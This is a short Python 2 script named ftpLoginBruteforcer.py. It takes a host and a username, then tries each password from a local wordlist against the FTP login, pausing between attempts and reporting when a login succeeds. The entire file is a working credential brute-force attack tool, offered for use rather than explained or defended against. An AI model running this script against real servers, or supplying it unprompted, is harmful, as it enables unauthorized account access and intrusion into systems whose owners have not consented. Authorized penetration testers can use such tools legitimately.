#!/usr/bin/python
import ftplib
import sys
import time

usage = """
Usage:

$ ftpLoginBruteforcer.py [HOST] [USERNAME]

"""

if len(sys.argv) != 3:
    print usage
    exit(0)

ftp = ftplib.FTP(sys.argv[1])
username = sys.argv[2]

print ftp.getwelcome()
# pwds = ['root','123456','password']
tries = 0
# for p in open('/Users/bl4de/hacking/dictionaries/passwords_5445.txt', 'r').readlines():
for p in open('./passwords.txt', 'r').readlines():
# for p in pwds:
    try:
        tries = tries + 1
        print "[+] try {}: trying {}:{}".format(tries, username, p.strip())
        resp = ftp.sendcmd('USER {}'.format(username))
        print resp
        time.sleep(4)
        resp = ftp.sendcmd('PASS {}'.format(p.strip()))
        print resp
        print "[+] Logged in! -> {}".format(str(resp))
        exit(0)
    except Exception, e:
        print e
        pass

